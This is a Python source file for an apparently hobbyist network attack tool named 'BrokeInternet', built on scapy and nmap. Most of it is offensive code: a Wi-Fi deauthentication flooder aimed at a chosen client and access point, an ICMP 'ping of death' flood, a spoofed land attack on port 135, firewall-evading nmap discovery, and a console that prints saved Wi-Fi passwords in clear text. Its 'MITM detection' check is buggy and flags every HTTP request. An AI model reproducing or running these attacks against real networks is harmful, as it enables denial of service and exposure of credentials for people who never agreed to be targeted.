#!/usr/bin/python3
import sys

from scapy.all import *
from colorama import Fore,Back,Style
from scapy.layers import http
import scapy.all as scapy
import time
import requests
import argparse
import nmap
import subprocess
import binascii
import shlex


def get_help_documentation():

    print("""
F-BrokeInt
  ___
 |   \
 |    \                   ___
 |_____\______________.-'`   `'-.,___
/| _____     _________            ___>---||\\?*------||\\?*-->
\|___________________________,.-'`
          `'-.,__________)--
                            
Development:HunkarAcar
Program:Network discovery, Attack and Detection
Version: V-1.2.2
    """)
    time.sleep(1)


    parser = argparse.ArgumentParser(
        prog='BrokeInternet',
        description="network denial of service attack"
    )

    parser.add_argument('-ip','--ipaddress',type=str,
                        help='It will scan ip addresses with cidr display')

    parser.add_argument('-nmap','--nmap', action="store_true",
                        help='It aims to learn mac address of devices using nmap')

    parser.add_argument('-sI', '--source_ip',type=str,
                        help='Source ip is required for (land attack)')

    parser.add_argument('-dI','--destination_ip',type=str,
                        help='Destination ip is required for land attack(Destination to send packages to)')

    parser.add_argument('-deauth', '--deauth',type=int,
                        help='we need to specify how many packages we will send')

    parser.add_argument('-a','--accesspoint',type=str,
                        help='modem Mac address required')

    parser.add_argument('-c','--client',type=str,
                        help='Target client Mac address required')

    parser.add_argument('-iface','--iface',type=str,
                        help='network interface must be specified')

    parser.add_argument('-M','--mitm',required=False,action='store_true',
                        help='detects a man-in-the-middle attack at a basic level')

    parser.add_argument('-network','--network',action='store_true',
                        help='Shows the networks around in detail')

    parser.add_argument('-netPas','--networkPassword',action='store_true',
                        help="shows the wifi passwords you are using")

    parser.add_argument('-d','--data', type=int,default=120,
                        help='ICMP ping specifies the data size to be sent in a DOS attack')

    parser.add_argument('-C','--count',type=int, default=1000,
                        help='ICMP ping and Land attack Specifies the number of packets to be sent in a DOS attack')

    args = parser.parse_args()

    return args



import scapy.all as scapy


def get_scanARP_network(ip_range):

    try:
        # Detect devices on the network using ARP request
        arp_request = scapy.ARP(pdst=ip_range)
        arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

        # Combine packets
        arp_request_broadcast = arp_broadcast / arp_request

        # Send and receive packets, timeout=40s
        answered_list = scapy.srp(arp_request_broadcast, timeout=40, verbose=True)[0]

        # Processing responses
        devices = []

        if answered_list:
            print()
            print("IP" + " " * 24 + "MAC" + " " * 24 + "Vendor")
            print("_____________________________________________________________________________")
            host_count = 0
            for received_packet in answered_list:
                # Get IP and MAC from the received packet
                ip_address = received_packet[1].psrc
                mac_address = received_packet[1].hwsrc

                # Append the device information to the list
                devices.append({'ip': ip_address, 'mac': mac_address})

                # Fetch vendor information using MAC address
                url_mac_api = f"https://api.macvendors.com/{mac_address}"
                response = requests.get(url_mac_api)
                host_count += 1

                # Print IP, MAC, and Vendor information
                if response.status_code == 200:
                    print("{:16}      {}         {}".format(ip_address, mac_address, response.text))

                else:
                    print("{:16}      {}            unknown".format(ip_address,mac_address))


            print("\n\n\nBrokeint software discovered the hosts with ARP scanning.")
            print(f"Brokeint software detected {host_count} hosts up..")
            print("Brokeint Software Version 1.2.2-V")
            print("ARP Scan Completed.\n")

        else:
            print(Fore.RED + "No devices found on the network" + Fore.RESET)
            print("\nARP Scan Completed.\n")


    except KeyboardInterrupt:
        print(Fore.RED + "\nArp scanning process terminated!!!\n" + Fore.RESET)

    except Exception as e:
        print(f"Error Capture => {e}")

    """
    for response in answered_list:
        device = {
            "IP": response[1].psrc,
            "MAC": response[1].hwsrc
        }
        devices.append(device)

    return devices

    get_scanARP_network = get_scanARP_network(ip_range)

    #print result

    if get_scanARP_network:
        print(Fore.GREEN + "Discovered Devices:" + Fore.RESET)
        for device in get_scanARP_network:
            pprint.pprint(f"IP:{device['IP']}\nMAC: {device['MAC']}")
            #print(f"IP:{device['IP']}\nMAC: {device['MAC']}")
    
    else:
        print(Fore.RED + "No devices found on the network" + Fore.RESET )
    """


def get_scan_with_nmap(ip_range):

    #Detect devices on network using nmap
    scanner = nmap.PortScanner()
    host = ip_range
    #Detects devices and mac addresses on the network with a powerful nmap scanning scripting
    argument = " -n -sn -PR --data-length 32 -f --scan-delay 3"

    print("\nBrokeint software started detecting hosts on the local network using Nmap")
    print("It uses the same methods as arp scan, but is effective for bypassing firewalls.")
    print("Host Discovery begins..($)..\n")
    time.sleep(2)

    scan_result = scanner.scan(hosts=host,arguments=argument)

    #print(type(scan_result)) => dict type

    #logic process

    if 'scan' in scan_result:

        host_count = 0
        for ip, result in scan_result['scan'].items():
            mac_address = result['addresses'].get('mac', 'Not Found')
            status = result['status']['state']
            host_count +=  1
            print(f"IP: {ip}\nMAC: {mac_address}\nState: {status}")

        print("\n\nBrokeint software discovered the host with Nmap scanning.")
        print(f"Brokeint software with Nmap detected {host_count} host up..")
        print("Brokeint Software Version 1.2.2-V")
        print("Host Scan Completed.\n")

    else:
        print(Fore.RED + "No Devices found on the network" + Fore.RESET)



def attack_deauth(deauth_packet, accesspoint, client, iface):

    access_mac = accesspoint.replace(':', '')
    target_mac = client.replace(':', '')

    def create_deauth_packet(target_mac, access_mac):
        target_mac = binascii.unhexlify(target_mac)
        access_mac = binascii.unhexlify(access_mac)
        packet = b"\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x10\x10\x10\x10" + access_mac + target_mac + b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x10\x10"
        return packet

    def send_deauth_packets(deauth_packet, access_mac, target_mac, iface):
        deauth_packets = create_deauth_packet(target_mac, access_mac)

        try:

            print(Fore.GREEN + "DEAUTH ATTACK BEGINS...\n" + Fore.RESET)
            time.sleep(1)

            for i in range(deauth_packet):
                sendp(deauth_packets, iface=iface, count=500 ,inter=0.001, verbose=False)
                print(f"Deauth {deauth_packet} packet sent of Target Address {target_mac}")
                time.sleep(0.1)


        except KeyboardInterrupt:
            print(Fore.RED + "\nDEAUTH ATTACK STOPPED!!\n" + Fore.RESET)
            sys.exit(0)

    send_deauth_packets(deauth_packet, access_mac, target_mac, iface)



def ping_of_death_ICMP(target_ip,data,packet_count,iface):

    try:
        icmp_packet = IP(dst=target_ip) / ICMP() / ("Death"*data)
        for pack in range(packet_count):
            sendp(icmp_packet, count=500,iface=iface,verbose=True)

    except KeyboardInterrupt:
        print(Fore.RED + "\nPıng Of DeATH ICMP attack Stopped:::\n" + Fore.RESET)
        sys.exit(0)

    except Exception as e:
        print(f"Error Capture => {e}")



def land_attack(source_ip,target_ip,count_packet):

    try:
        for packt in range(count_packet):
            send(IP(src=source_ip, dst=target_ip) / TCP(sport=135, dport=135), count=300)

    except KeyboardInterrupt:
        print(Fore.RED + "\nLand Attack(Microsoft Windows) Stopped!!\n" + Fore.RESET)
        sys.exit(0)

    except Exception as e:
        print(f"\nError Capture => {e}")


def mitm_attack_detect(interface):

    try:
        def process_packet(packet):
            if packet.haslayer(http.HTTPRequest):
                url = get_url(packet)

                if "login" or "my-account" or "sign in" or "account" or "giriş" or "üye ol" or "kaydol" or "Register" in url:
                    print(Fore.RED + "Possible MITM Attack Detected: Dangerous URL - " + url + Fore.RESET)

                else:
                    print(Fore.YELLOW + "HTTP Request: " + url + Fore.RESET)

        def get_url(packet):

            return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        scapy.sniff(iface=interface, store=False, prn=process_packet)


    except KeyboardInterrupt:
        print(Fore.BLUE + "\nMITM attack detection stopped\n" + Fore.RESET)

    except Exception as e:
        print("ERROR occured:", str(e))
        return False


def get_detailed_network():

    command = "netsh wlan show network mode=bssid"

    try:

        command_execute = subprocess.call(shlex.split(command))
        return command_execute

    except Exception as error:

        print(Fore.RED + f"The command only works on windows operating system!!!!\n{error}" + Fore.RESET)
        return None


def get_Detalied_Network_Password():

    print("passconsole => You can switch to interactive shell by typing passconsole")
    get_console = input(">")

    if get_console == "passconsole":

        print("---------------------------------")
        print("""
        help > networkShow => Shows the wifi you have used
        help > networkPassword => Shows the passwords of the wifi you use
        help > help => Get help Documentation
        help > exit => Exit the program
        """)
        print("---------------------------------")

        while 1==1:

            try:

                get_command = input("passconsole>")

                if get_command == "networkShow":

                    command_e = "netsh wlan show profile"
                    command_exe = subprocess.call(shlex.split(command_e))
                    print(command_exe)

                elif get_command == "networkPassword":

                    get_SSID = input("Enter the name of the SSID whose password you want to see> ")
                    command_e = f"netsh wlan show profile '{get_SSID}' key=clear"

                    command_exe = subprocess.call(shlex.split(command_e))
                    print(command_exe)

                elif get_command == "help":
                    print("---------------------------------")
                    print("""
                       help > networkShow => Shows the wifi you have used
                       help > networkPassword => Shows the passwords of the wifi you use
                       help > help => Get help Documentation
                       help > exit => Exit the program
                       """)
                    print("---------------------------------")


                elif get_command == "exit":
                    break

                else:
                    print("Wrong Choice!!")

            except KeyboardInterrupt:
                print(Fore.RED + """
                BYE !!
                """ + Fore.RESET)
                break

    else:

        print("You must write > passconsole ")




    """
    command_e = "netsh wlan show profile"

    command_exe = subprocess.call(shlex.split(command_e))
    return command_exe 
    """


"""
Deauth Attack using Python 
GUI design for this code with PYTQ5
Network Scan and detect device 

"""


def main():

    args = get_help_documentation()

    ipaddress = args.ipaddress
    i_face = args.iface
    deauth = args.deauth
    access_point = args.accesspoint
    client_mac = args.client
    data_icmp = args.data
    packet_count = args.count
    source_ip = args.source_ip
    destination_ip = args.destination_ip

    if args.mitm:
        print(mitm_attack_detect(i_face))

    elif args.ipaddress and args.data and args.count and args.iface:
        ping_of_death_ICMP(ipaddress,data_icmp,packet_count,i_face)


    elif args.deauth and args.accesspoint and args.client and args.iface:
        attack_deauth(deauth, access_point, client_mac, i_face)

    elif args.destination_ip and args.source_ip and args.count:
        land_attack(source_ip,destination_ip,packet_count)


    elif args.nmap:
        get_scan_with_nmap(ipaddress)


    elif args.network:
        print(get_detailed_network())


    elif args.networkPassword:
        get_Detalied_Network_Password()


    elif args.ipaddress:
        get_scanARP_network(ipaddress)


if __name__ == "__main__":
    main()
